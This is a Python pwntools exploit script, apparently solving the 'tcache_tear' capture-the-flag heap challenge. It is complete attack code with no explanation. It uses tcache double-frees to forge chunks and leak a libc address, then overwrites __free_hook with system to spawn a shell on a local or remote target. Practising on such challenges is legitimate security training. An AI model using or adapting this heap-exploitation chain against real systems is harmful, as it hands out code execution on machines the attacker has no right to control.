from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b *0x000000000400BC7
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './tcache_tear_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
#    Arch:     amd64-64-little
#    RELRO:    Full RELRO
#    Stack:    Canary found
#    NX:       NX enabled
#    PIE:      No PIE (0x3ff000)
#    RUNPATH:  b'.'
#    FORTIFY:  Enabled
p = start()
libc = ELF('libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so', checksec=False)

def malloc(size, data):
    p.sendlineafter('Your choice :', b'1')
    p.sendlineafter('Size:', str(size).encode())
    p.sendlineafter('Data:', data)

def free():
    p.sendlineafter('Your choice :', b'2')

p.sendlineafter('Name:', b'quangba')
malloc(0x70, b'quangba')
free()
free()
malloc(0x70, p64(0x000000000602550))
malloc(0x70, b'quangba')
payload1 = p64(0)  	# Previous Size
payload1 += p64(0x21) 	# Chunk Size (A=0, M=0, P=1)
payload1 += p64(0)  	# Forward Pointer
payload1 += p64(0)  	# Backward Pointer
payload1 += p64(0)  	# Empty Space
payload1 += p64(0x21)	# Next Previous Size
malloc(0x70, payload1)

malloc(0x60, b'quangba')
free()
free()
malloc(0x60, p64(0x000000000602050))
malloc(0x60, b'quangba')
payload1 = p64(0)   # prev_size
payload1 += p64(0x501)   # size
payload1 += p64(0)   # fd
payload1 += p64(0)  # bk
payload1 += p64(0) * 3
payload1 += p64(0x000000000602060)
malloc(0x60, payload1)
free()
p.sendlineafter('Your choice :', b'3')
p.recvuntil(b'Name :')
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - (libc.symbols['main_arena'] + 96 )
log.info('libc.address: ' + hex(libc.address))
free_hook = libc.symbols['__free_hook']
system = libc.symbols['system']
malloc(0x50, b'quangba')
free()
free()
malloc(0x50, p64(free_hook))
malloc(0x50, b'quangba')
malloc(0x50, p64(system))
malloc(0x50, b'/bin/sh\x00')
free()

p.interactive()

